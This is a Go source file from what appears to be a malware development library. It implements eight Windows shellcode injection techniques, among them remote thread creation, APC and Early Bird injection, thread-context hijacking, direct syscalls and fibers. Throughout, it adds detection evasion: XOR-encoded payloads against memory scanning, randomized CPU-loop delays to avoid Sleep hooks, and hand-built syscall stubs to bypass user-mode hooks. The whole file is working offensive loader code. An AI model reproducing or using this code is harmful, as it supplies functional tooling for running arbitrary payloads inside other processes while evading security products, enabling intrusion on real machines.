//go:build windows

package injection

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// Windows injection constants
const (
	threadAllAccess = 0x1FFFFF // THREAD_ALL_ACCESS

	opcodeMovEax    = 0xB8
	syscallScanSize = 10

	threadWaitTimeout          = 2000
	cpuDelayMaxIterations      = 5000000
	cpuDelayFallbackIterations = 3000000

	contextFull = 0x10001F // CONTEXT_FULL (x64)
)

// context64 represents an x64 thread context (simplified).
type context64 struct {
	_                    [6]uint64 // P1Home-P6Home
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// windowsInjector implements injection for Windows.
type windowsInjector struct {
	config *Config
}

func validateShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	return nil
}

func xorEncodeShellcode(shellcode []byte) (encoded []byte, key byte, err error) {
	xorKey := make([]byte, 1)
	_, err = rand.Read(xorKey)
	if err != nil {
		return nil, 0, fmt.Errorf("failed to generate XOR key: %w", err)
	}
	key = xorKey[0]

	encoded = make([]byte, len(shellcode))
	copy(encoded, shellcode)
	for i := range encoded {
		encoded[i] ^= key
	}

	return encoded, key, nil
}

func xorDecodeInPlace(addr uintptr, size int, key byte) {
	for i := 0; i < size; i++ {
		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
		*ptr ^= key
	}
}

func cpuDelay() {
	iterations, err := rand.Int(rand.Reader, big.NewInt(cpuDelayMaxIterations))
	if err != nil {
		iterations = big.NewInt(cpuDelayFallbackIterations)
	}
	limit := iterations.Int64()

	var counter int64
	for counter < limit {
		counter++
		_ = counter * 2
	}
}

func newPlatformInjector(cfg *Config) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	return &windowsInjector{config: cfg}, nil
}

func (w *windowsInjector) Inject(shellcode []byte) error {
	switch w.config.Method {
	case MethodCreateRemoteThread:
		return w.injectCreateRemoteThread(shellcode)
	case MethodCreateThread:
		return w.injectCreateThread(shellcode)
	case MethodQueueUserAPC:
		return w.injectQueueUserAPC(shellcode)
	case MethodEarlyBirdAPC:
		return w.injectEarlyBird(shellcode)
	case MethodProcessHollowing:
		return w.injectProcessHollowing(shellcode)
	case MethodRtlCreateUserThread:
		return w.injectRtlCreateUserThread(shellcode)
	case MethodDirectSyscall:
		return w.injectDirectSyscall(shellcode)
	case MethodCreateFiber:
		return w.injectCreateFiber(shellcode)
	default:
		return fmt.Errorf("unknown injection method: %s", w.config.Method)
	}
}

// --- Method 1: CreateRemoteThread ---

func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for CreateRemoteThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	hThread, _, err := api.ProcCreateRemoteThread.Call(
		uintptr(hProcess),
		0, 0,
		addr,
		0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// --- Method 2: CreateThread (self, with evasion) ---

func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. XOR encode shellcode (memory scan evasion)
	encoded, key, err := xorEncodeShellcode(shellcode)
	if err != nil {
		return fmt.Errorf("XOR encoding failed: %w", err)
	}

	// 2. Allocate with PAGE_READWRITE (less suspicious)
	addr, _, err := api.ProcVirtualAlloc.Call(
		0,
		uintptr(len(encoded)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 3. Copy encoded shellcode
	api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&encoded[0])),
		uintptr(len(encoded)),
	)

	// 4. CPU delay (temporal evasion, avoids Sleep API)
	cpuDelay()

	// 5. Decode shellcode in place
	xorDecodeInPlace(addr, len(encoded), key)

	// 6. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	ret, _, err := api.ProcVirtualProtect.Call(
		addr,
		uintptr(len(encoded)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	// 7. Create thread with NtCreateThreadEx (stealthier than CreateThread)
	var hThread uintptr
	currentProcess := ^uintptr(0) // -1 in uintptr

	status, _, _ := api.ProcNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		threadAllAccess,
		0,
		currentProcess,
		addr,
		0,
		0, 0, 0, 0, 0,
	)
	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: status 0x%X", status)
	}

	// 8. Wait briefly for thread to start (100ms)
	api.ProcWaitForSingleObject.Call(hThread, 100)
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// --- Method 3: QueueUserAPC ---

func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for QueueUserAPC")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// Find all threads of the target process
	threadIDs, err := findAllThreads(w.config.PID)
	if err != nil {
		return fmt.Errorf("failed to find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for PID %d", w.config.PID)
	}

	success := false
	for _, threadID := range threadIDs {
		hThread, err := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false,
			threadID,
		)
		if err != nil {
			continue
		}

		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))

		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)

		api.ProcResumeThread.Call(uintptr(hThread))

		windows.CloseHandle(hThread)

		if apcRet != 0 && count != 0xFFFFFFFF {
			success = true
			break
		}
	}

	if !success {
		return fmt.Errorf("failed to queue APC on any thread")
	}

	return nil
}

// --- Method 4: Early Bird APC ---

func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	apcRet, _, _ := api.ProcQueueUserAPC.Call(
		addr,
		uintptr(pi.Thread),
		0,
	)
	if apcRet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("QueueUserAPC failed")
	}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread failed: %w", err)
	}

	return nil
}

// --- Method 5: Process Hollowing ---

func (w *windowsInjector) injectProcessHollowing(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	var ctx context64
	ctx.ContextFlags = contextFull

	retGet, _, _ := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retGet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext failed")
	}

	ctx.Rip = uint64(addr)

	retSet, _, _ := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retSet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext failed")
	}

	windows.ResumeThread(pi.Thread)

	return nil
}

// --- Method 6: RtlCreateUserThread ---

func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for RtlCreateUserThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_CREATE_THREAD,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	var hThread uintptr
	status, _, _ := api.ProcRtlCreateUserThread.Call(
		uintptr(hProcess),
		0,    // SecurityDescriptor
		0,    // CreateSuspended = FALSE
		0,    // StackZeroBits
		0,    // StackReserve
		0,    // StackCommit
		addr, // StartAddress
		0,    // Parameter
		uintptr(unsafe.Pointer(&hThread)),
		0, // ClientId
	)

	if status != 0 {
		return fmt.Errorf("RtlCreateUserThread failed: NTSTATUS 0x%X", status)
	}

	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// --- Method 7: Direct Syscall ---

func getSyscallNumber(funcName string) (uint16, error) {
	proc := api.Ntdll.NewProc(funcName)
	addr := proc.Addr()

	for i := 0; i < syscallScanSize; i++ {
		opcode := (*byte)(unsafe.Pointer(addr + uintptr(i)))
		if *opcode == opcodeMovEax {
			byte1 := (*byte)(unsafe.Pointer(addr + uintptr(i+1)))
			byte2 := (*byte)(unsafe.Pointer(addr + uintptr(i+2)))
			syscallNum := uint16(*byte1) | (uint16(*byte2) << 8)
			return syscallNum, nil
		}
	}

	return 0, fmt.Errorf("failed to find syscall number for %s", funcName)
}

func doSyscall(syscallNum uint16, args ...uintptr) (uintptr, error) {
	// Create syscall stub in memory
	stub := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx
		0xB8, byte(syscallNum), byte(syscallNum >> 8), 0x00, 0x00, // mov eax, syscallNum
		0x0F, 0x05, // syscall
		0xC3, // ret
	}

	stubAddr, _, err := api.ProcVirtualAlloc.Call(
		0,
		uintptr(len(stub)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if stubAddr == 0 {
		return 0, fmt.Errorf("failed to allocate syscall stub: %w", err)
	}
	defer api.ProcVirtualFree.Call(stubAddr, 0, windows.MEM_RELEASE)

	ret, _, err := api.ProcRtlMoveMemory.Call(stubAddr, uintptr(unsafe.Pointer(&stub[0])), uintptr(len(stub)))
	if ret == 0 {
		return 0, fmt.Errorf("failed to copy syscall stub: %w", err)
	}

	var result uintptr
	switch len(args) {
	case 0:
		result, _, _ = syscall.Syscall(stubAddr, 0, 0, 0, 0)
	case 1:
		result, _, _ = syscall.Syscall(stubAddr, 1, args[0], 0, 0)
	case 2:
		result, _, _ = syscall.Syscall(stubAddr, 2, args[0], args[1], 0)
	case 3:
		result, _, _ = syscall.Syscall(stubAddr, 3, args[0], args[1], args[2])
	case 4:
		result, _, _ = syscall.Syscall6(stubAddr, 4, args[0], args[1], args[2], args[3], 0, 0)
	case 5:
		result, _, _ = syscall.Syscall6(stubAddr, 5, args[0], args[1], args[2], args[3], args[4], 0)
	case 6:
		result, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
	case 7:
		result, _, _ = syscall.Syscall9(stubAddr, 7, args[0], args[1], args[2], args[3], args[4], args[5], args[6], 0, 0)
	case 8:
		result, _, _ = syscall.Syscall9(stubAddr, 8, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], 0)
	case 9:
		result, _, _ = syscall.Syscall9(stubAddr, 9, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8])
	default:
		var arg6, arg7, arg8, arg9, arg10, arg11 uintptr
		if len(args) > 6 {
			arg6 = args[6]
		}
		if len(args) > 7 {
			arg7 = args[7]
		}
		if len(args) > 8 {
			arg8 = args[8]
		}
		if len(args) > 9 {
			arg9 = args[9]
		}
		if len(args) > 10 {
			arg10 = args[10]
		}
		if len(args) > 11 {
			arg11 = args[11]
		}
		result, _, _ = syscall.Syscall12(stubAddr, uintptr(len(args)),
			args[0], args[1], args[2], args[3], args[4], args[5],
			arg6, arg7, arg8, arg9, arg10, arg11)
	}

	return result, nil
}

func (w *windowsInjector) injectDirectSyscall(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Extract syscall numbers dynamically
	ntAllocateVirtualMemory, err := getSyscallNumber("NtAllocateVirtualMemory")
	if err != nil {
		return fmt.Errorf("failed to get NtAllocateVirtualMemory syscall: %w", err)
	}

	ntProtectVirtualMemory, err := getSyscallNumber("NtProtectVirtualMemory")
	if err != nil {
		return fmt.Errorf("failed to get NtProtectVirtualMemory syscall: %w", err)
	}

	ntCreateThreadEx, err := getSyscallNumber("NtCreateThreadEx")
	if err != nil {
		return fmt.Errorf("failed to get NtCreateThreadEx syscall: %w", err)
	}

	// 2. XOR encode shellcode
	encoded, key, err := xorEncodeShellcode(shellcode)
	if err != nil {
		return fmt.Errorf("XOR encoding failed: %w", err)
	}

	// 3. Allocate memory via direct syscall
	var baseAddr uintptr = 0
	regionSize := uintptr(len(encoded))

	status, err := doSyscall(
		ntAllocateVirtualMemory,
		^uintptr(0),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory syscall failed: %w", err)
	}
	if status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
	}

	// 4. Copy encoded shellcode
	api.ProcRtlMoveMemory.Call(
		baseAddr,
		uintptr(unsafe.Pointer(&encoded[0])),
		uintptr(len(encoded)),
	)

	// 5. CPU delay
	cpuDelay()

	// 6. Decode shellcode in place
	xorDecodeInPlace(baseAddr, len(encoded), key)

	// 7. Change permissions via direct syscall
	var oldProtect uint32
	status, err = doSyscall(
		ntProtectVirtualMemory,
		^uintptr(0),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory syscall failed: %w", err)
	}
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
	}

	// 8. Create thread via direct syscall
	var hThread uintptr
	status, err = doSyscall(
		ntCreateThreadEx,
		uintptr(unsafe.Pointer(&hThread)),
		threadAllAccess,
		0,
		^uintptr(0),
		baseAddr,
		0, 0, 0, 0, 0, 0,
	)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx syscall failed: %w", err)
	}
	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X", status)
	}

	// 9. Wait briefly for thread to start
	api.ProcWaitForSingleObject.Call(hThread, 100)
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// --- Method 8: CreateFiber ---

func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Allocate and prepare memory (RW -> Copy -> RX)
	addr, err := allocateAndWriteMemoryLocal(shellcode)
	if err != nil {
		return fmt.Errorf("memory allocation failed: %w", err)
	}

	// 2. Convert current thread to Fiber
	mainFiber, _, err := api.ProcConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return fmt.Errorf("ConvertThreadToFiber failed: %w", err)
	}

	// 3. Create a Fiber with shellcode as start function
	shellcodeFiber, _, err := api.ProcCreateFiber.Call(0, addr, 0)
	if shellcodeFiber == 0 {
		return fmt.Errorf("CreateFiber failed: %w", err)
	}

	// 4. Switch to shellcode Fiber (execution!)
	api.ProcSwitchToFiber.Call(shellcodeFiber)

	return nil
}

// --- Helper functions ---

func findFirstThread(pid int) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	if err := windows.Thread32First(snapshot, &te); err != nil {
		return 0, err
	}

	for {
		if te.OwnerProcessID == uint32(pid) {
			return te.ThreadID, nil
		}
		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("no thread found for PID %d", pid)
}

func findAllThreads(pid int) ([]uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	if err := windows.Thread32First(snapshot, &te); err != nil {
		return nil, err
	}

	var threads []uint32
	for {
		if te.OwnerProcessID == uint32(pid) {
			threads = append(threads, te.ThreadID)
		}
		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}

	return threads, nil
}

func allocateAndWriteMemoryLocal(shellcode []byte) (uintptr, error) {
	// 1. Allocate with PAGE_READWRITE
	addr, _, err := api.ProcVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 2. Copy shellcode
	ret, _, err := api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("RtlMoveMemory failed: %w", err)
	}

	// 3. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	ret, _, err = api.ProcVirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
	}

	return addr, nil
}

func allocateAndWriteMemoryRemote(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
	// 1. Allocate with PAGE_READWRITE
	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// 2. Write shellcode
	var bytesWritten uintptr
	ret, _, err := api.ProcWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// 3. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	ret, _, err = api.ProcVirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
	}

	return addr, nil
}
